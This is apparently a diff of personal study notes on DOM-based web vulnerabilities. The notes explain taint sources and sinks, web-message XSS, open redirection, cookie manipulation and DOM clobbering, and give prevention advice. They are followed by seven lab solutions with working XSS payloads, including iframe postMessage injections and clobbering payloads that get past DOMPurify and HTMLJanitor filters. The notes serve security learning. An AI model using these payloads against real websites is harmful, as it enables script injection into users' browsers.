@@ -1,23 +1,323 @@
 DOM (Document Object Model):
-- A web browser's hierachical representation of the element on the page.
-- Can use Javascript to manipulate the nodes and objects of DOM, as well as properties
-- DOM manipulation in itself is not a problem, integral part of how modern website work
-- Vulnerabilities arise when web contain Javascript that take attacker controllable (source), and pass it into a dangerous function (sink)
+- A web browser's hierachical representation of the element on the page
+- Can use JS to manipulate the properties, nodes and objects of DOM
+- DOM manipulation itself is not a problem, it just integral part of how modern website work
+- Vulnerabilities arise when:
+    + Handle data insecurely
+    + Contain JS that take attacker controllable (source), and pass it into a dangerous function (sink)
 
 Taint-flow vulnerabilities:
-- Source: is a Javascript property that accepts data that is potentially attacker-controlled
-    + Example: location.search (read input from query string), document.referer, document.cookie
-- Sink: is a potentially danggerous Javascript function or DOM that can cause undesirable effects if attacker controlled data is pass to it.
-    + Example: eval() because it process the argument that is passed to Javascript
-                document.body.innerHTML
+- Many can traced back to problems with the way client-side code manipulate input data 
+
+- What is taint flow:
+    + Source: JS property that accepts data that is potentially attacker-controlled
+        + Example: location.search (read input from query string), document.referer, document.cookie, and web messages,...
+    + Sink: potentially danggerous JS function or DOM object that can cause undesirable effects if attacker-controlled data is pass to it.
+        + Example: eval() (process argument as JS), document.body.innerHTML (allow inject maliciouse HTML and execute arbitrary JS)
+    
 - Vuln arise when web pass data from a source to sink in unsafe way.
 - Most common source is URL, typically accessed with location object
-    + Attacker can construct a link to send a victim to vuln page with payload in query string
-        goto = location.hash.slice(1)
-        if (goto.startsWith('https:')) {
-            location = goto;
+- Attacker can construct a link to redirect victim to vuln page with payload in query string and fragment portions of URL
+    goto = location.hash.slice(1)
+    if (goto.startsWith('https:')) {
+        location = goto;
+    }
+    https://www.innocent-website.com/example#https://www.evil-user.net
+    + location.hash handled in unsafe way -> vuln to DOM-based open redirection
+    + It extract value of 'location.hash' property, set it as 'location' property of 'window'
+- Common source: 
+    + document.URL
+    + document.documentURI
+    + document.URLUnencoded
+    + document.baseURI
+    + location
+    + document.cookie
+    + document.referrer
+    + window.name
+    + history.pushState
+    + history.replaceState
+    + localStorage
+    + sessionStorage
+    + IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
+    + Database
+- Sink:
+    + document.write()
+    + window.location
+    + document.cookie
+    + eval()
+    + document.domain
+    + WebSocket()
+    + element.src
+    + postMessage()
+    + setRequestHeader()
+    + FileReader.readAsText()
+    + ExecuteSql()
+    + sessionStorage.setItem()
+    + document.evaluate()
+    + JSON.parse()
+    + element.setAttribute()
+    + RegExp()
+
+
+Controlling the web message source: (1, 2, 3)
+- Idea: web messages (postMessage() method) can act as source on page
+- Root cause: page handle imcoming web msg in unsafe way:
+    + For example, event listener doesn't verify origin correctly
+    -> properties and functions that called by that listener can become sink
+- Attacker flow:
+    + Could host malicious iframe
+    + Use postMessage() to send msg data to vuln event listener
+    + Then listener send payload to sink on the parent page
+- Impact:
+    + Depend on destination document's handling of incoming message
+    + If destination document trust sender and hanle data in unsafe way, then pass it to sink -> allow attacker compromise the user
+- How to construct attack:
+    + Example vuln code:
+        <script>
+            window.addEventListener('message', function(e) {
+                eval(e.data);
+            });
+        </script>
+    + Example payload:
+        <iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
+        + Place this in attacker's server, victim visit -> trigger
+        + this -> iframe
+        + this.contentWindow -> vuln web
+        + '*' -> accept cross-origin
+- Origin verification:
+    + Even include some form of origin verification, sometimes still can be flawed. Example:
+        window.addEventListener('message', function(e) {
+            if (e.origin.indexOf('normal-website.com') > -1) {
+                eval(e.data);
+            }
+        });
+    + Flaw function:
+        + indexOf(), startsWith(): http://www.normal-website.com.evil.net
+        + endsWith(): http://www.malicious-websitenormal-website.com
+
+
+DOM-based open redirect: (4)
+- Example vuln code:
+    let url = /https?:\/\/.+/.exec(location.hash);
+    if (url) { location = url[0]; }
+- Example payload: https://vulnerable-site.com/redirect#https://attacker-controlled-site.com
+- Impact:
+    + Phishing: attacker uses an authentic app url (correct domain + valid TLS cert) that redirect to a malicious site
+        -> lend credibility to attack, if not verify, won't notice subsequent redirection to a different domain
+    + Escalate into JS injection attack: could contruct with javascript: pseudo-protocol to execute arbitrary code
+- Sink can lead to vuln:
+    + location, location.host, location.hostname, location.href, location.pathname
+    + location.search, location.protocol, location.assign(), location.replace()
+    + open(), element.srcdoc
+    + XMLHttpRequest.open(), XMLHttpRequest.send()
+    + jQuery.ajax(), $.ajax()
+- How to prevent:
+    + Avoid dynamically setting redirection target using data originated from any untrusted source
+    + https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
+
+
+DOM-based cookie manipulation: (5)
+- Some web transforms normally-safe data type (such as cookies) into potential sources (without sanitizing)
+- Attacker could construct URL that if victim visit will set arbitrary value in user's cookie
+- Example vuln code:
+    document.cookie = 'cookieName='+location.hash.slice(1);
+- Impact:
+    + Depend on role that cookie play within the website
+    + Used to control behavior result from certain user action (such as production or demo mode setting)
+    + If used to track user's session -> can perform session fixation attack
+        https://owasp.org/www-community/attacks/Session_fixation
+        + Set cookie to valid token of attacker -> hijack session during victim's subsequent interaction
+        + Can use in other website under same parent domain
+- Sink can lead to vuln:
+    + document.cookie
+- How to prevent: avoid dynamically writing to cookies using data that originated from any untrusted source
+
+
+DOM clobbering: (6, 7)
+- Technique that inject HTML into page to manipulate DOM and ultimately change behavior of JS on page
+- Useful when: XSS is not possible, but still possible to control some HTML where attribute 'id' or 'name' are whitelisted by HTML filter
+- Most common form: use anchor element to overwrite global var, then used by application in unsafe way (such as generate dynamic script URL)
+- How to exploit vuln:
+    + Common pattern used by JS dev:
+        var someObject = window.someObject || {};
+        + If window.someObject exist -> use it, else -> assign {}
+    + Example code:
+        <script>
+            window.onload = function(){
+                let someObject = window.someObject || {};
+                let script = document.createElement('script');
+                script.src = someObject.url;
+                document.body.appendChild(script);
+            };
+        </script>
+    + Could inject this payload to clobber (overwrite) the 'someObject' reference:
+        <a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
+        + 2 anchors use same ID -> group them in a DOM collection or HTML collection
+            someObject = HTMLCollection [<a>, <a name=url ...>]
+        + script.src = someObject.url need to assign string there. When <a> is force to convert to string -> return value of href
+        + id -> collection -> name -> property url -> href
+
+    + Another common technique is to use 'form', 'input' element to clobber DOM
+    + Example: clobbering 'attributes' property -> enable bypass client-side filter use in their logic -> can inject malicious attribute that would normally be filtered
+        <form onclick=alert(1)><input id=attributes>Click me
+    + This case, 'form' is whitelist element. Normally, filter would loop through 'attributes' property of form and remove blacklisted attributes
+        + But 'attributes' property has been clobbered with 'input' element -> filter loop though 'input' element instead
+        + As 'input' length is undefined, condition (ex: i < element.attributes.length) for loop not met -> filter just simply moves on to next element instead
+        -> allow alert() function to be called in browser
+
+- How to prevent DOM clobbering:
+    + Check obj and function are legitimate, if filter DOM, make sure that obj of function is not a DOM node
+    + Avoid bad code pattern (like using global var in conjunction with logical operator OR ||)
+    + Use well-tested library (such as DOMPurify)
+
+How to prevent DOM-based taint-flow vuln:
+- There is no single action can take to eliminate threat of DOM-based attack entirely
+- Most effective way is avoid allow data from any untrusted source to dynamically value that transmitted to any sink
+- If the desired function of application mean that this behavior is unavoidable, then defenses must implemented in client-side code
+- Many cases, data can validated on whitelist basis, other cases will necessary to sanitize or encode data
+
+
+
+01_DOM_XSS_using_web_messages
+- Notice websocket function
+    <script>
+        window.addEventListener('message', function(e) {
+            document.getElementById('ads').innerHTML = e.data;
+        })
+    </script>
+- Payload:
+    <iframe src="{url}" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
+
+02_DOM_XSS_using_web_messages_and_a_JavaScript_URL
+- Notice websocket function
+    <script>
+        window.addEventListener('message', function(e) {
+            var url = e.data;
+            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
+                location.href = url;
+            }
+        }, false);
+    </script>
+- Payload:
+    <iframe src="{url}" onload="this.contentWindow.postMessage('javascript:print()//https:','*')">
+- Can try some variant to understand how it work: (do in console)
+    location.href = "javascript:'Hello'"
+    location.href = "javascript:print();https;"
+
+03_DOM_XSS_using_web_messages_and_JSON_parse
+- Notice <script> tag
+    window.addEventListener('message', function(e) {
+        var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
+        document.body.appendChild(iframe);
+        try {
+            d = JSON.parse(e.data);
+        } catch(e) {
+            return;
         }
-        https://www.innocent-website.com/example#https://www.evil-user.net
-    + document.URL, document.documentURI, document.URLUnencoded, document.baseURI, location
-    + document.cookie, document.referrer, window.name, history.pushState, history.replaceState
-    + localStorage, sessionStorage, IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB), Database
+        switch(d.type) {
+            case "page-load":
+                ACMEplayer.element.scrollIntoView();
+                break;
+            case "load-channel":
+                ACMEplayer.element.src = d.url;
+                break;
+            case "player-height-changed":
+                ACMEplayer.element.style.width = d.width + "px";
+                ACMEplayer.element.style.height = d.height + "px";
+                break;
+        }
+    }, false);
+- Vuln:
+    + No origin check -> accept any cross-origin
+    + Case type=load-channel -> element.src = d.url
+- Payload:
+    <iframe src="{url}" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
+- Note:
+    + HTML/JS string accept both ' and ", but JSON only accept "
+    + Outer quote must differ from inner quote (onload='...("...")..')
+
+
+04_DOM_based_open_redirection
+- Notice returnUrl in blog post
+    <a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
+    + https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/exec
+    + https://www.w3schools.com/JSREF/jsref_regexp_exec.asp
+    + /regex/.exec(text): return array of object
+        [
+            {regex match},
+            {value of capturing group (inside ())},
+            index: {startPos},
+            input: {text},
+            groups: undefined
+        ]
+- So we just need to include url=exploit_server in blog URL
+    + But it can't place in fragment, must use as tmp param or value
+- Payload:
+    {url}/post?postId=10&url={exploit_server}
+
+05_DOM_based_cookie_manipulation
+- Notice <script> tag in blog post
+    <script>document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'</script>
+    + It set cookie to last blog url you visit and also render in any page
+    -> If can escape out of string, could inject XSS into page through cookie
+- Exploit: (3 way)
+    Send twice: <iframe src="{url}/product?productId=1&x='><script>print()</script><a x='">
+    Send once: <iframe src="{url}/product?productId=1&'><script>print()</script>" onload="this.src='{url}'">
+    Send once: <iframe src="{url}/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='{url}';window.x=1;">
+
+06_Exploiting_DOM_clobbering_to_enable_XSS
+- Notice JS at /resources/js/loadCommentsWithDomClobbering.js that will be called in post
+    <script>loadComments('/post/comment')</script>
+- To exploit using DOM clobber, we need to overwrite window.someObject and its child element
+    + First find 'window.' var that potential to exploit and identify its element
+        let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
+        let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';
+    + Look at avatarImgHTML var, i think that we should turn it into something like <img src='1' onerror=alert(1)>
+    + But when try to make it like that, new problem appear, if href contain space or quote, it will be encode
+- Try to look at domPurify.js
+    + Notice this line whitelist some scheme that allowed to include in href (http, https, ftp, ftps, mailto, tel, callto, cid, xmpp)
+        P = i(/^(?:(?:(?:f|ht)tps?|mailto|tel|callto|cid|xmpp):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i)
+    + And a blacklist scheme (...script like javascript and data)
+        G = i(/^(?:\w+script|data):/i)
+    -> We can use some scheme that the follow content won't be encode like mailto, tel, callto, cid or xmpp
+- Payload: (example with cid protocol)
+    <a id=defaultAvatar><a id=defaultAvatar name=avatar href='cid:" onerror=alert(1) x="1'>
+    <a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
+- Note:
+    + Need 2 comment to trigger XSS
+    + First comment just to clobber value of defaultAvatar and appear like this
+        <a href="cid:&quot;onerror=alert(1)//" name="avatar" id="defaultAvatar"></a>
+    + Second random comment will use to trigger it, make load and appear like this
+        <img class="avatar" src="cid:" onerror="alert(1)//"">
+    + Also each time post payload, number of <a> tag in HTMLCollection will increase, it append new create element
+        -> It will return first tag match with condition
+        -> duplicate tag still in colletion but never be called
+- Reason need 2 comment:
+    ...
+    let defaultAvatar = window.defaultAvatar || {...}
+    ...
+    userComments.appendChild(commentSection);
+    ...
+    + Local var: defaultAvatar
+    + Global var: window.defaultAvatar
+    + And we need payload already in DOM for window.defaultAvatar to point to before calling that -> every comment after that payload DOM can trigger XSS
+- Debug:
+    console.log(window.defaultAvatar);
+    console.log(window.defaultAvatar.length);
+    console.log(String(window.defaultAvatar.avatar));
+
+07_Clobbering_DOM_attributes_to_bypass_HTML_filters
+- Notice 2 file has been imported htmlJanitor.js (contain sanitizing function) and loadCommentsWithHtmlJanitor.js
+    + Look at HTMLJanitor Object
+        let janitor = new HTMLJanitor({tags: {
+            input: {name:true, type:true, value:true},
+            form: {id:true},
+            i:{}, b:{}, p:{}
+        }});
+    + It whitelist input, form and their attribute (but not sanitize in this step yet)
+    + Next, it try to remove blacklisted attributes by for loop
+        for (var a = 0; a < node.attributes.length; a++) { ... }
+    + But because id=attributes clobbered it, but input.length is undefined -> skip check and go to next step -> allow malicious attribute include in comment
+- Payload:
+    <form id=x tabindex=0 onfocus=print()><input id=attributes>
+    <iframe src="{url}/post?postId=3" onload="setTimeout(()=>this.src=this.src+'#x',500)">
